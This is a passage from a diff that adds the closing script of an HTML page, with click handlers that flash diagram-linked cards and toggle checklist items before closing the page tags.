+document.querySelectorAll('.diagram svg a').forEach(a => {
+  a.addEventListener('click', (e) => {
+    const href = a.getAttribute('href');
+    if (!href || !href.startsWith('#card-')) return;
+    setTimeout(() => { const t = document.querySelector(href); if (t) { t.classList.remove('flash'); void t.offsetWidth; t.classList.add('flash'); } }, 100);
+  });
+});
+document.querySelectorAll('.checklist li').forEach(li => { li.addEventListener('click', () => li.classList.toggle('done')); });
+updateCounts(); render();
+</script>
+</body>
+</html>
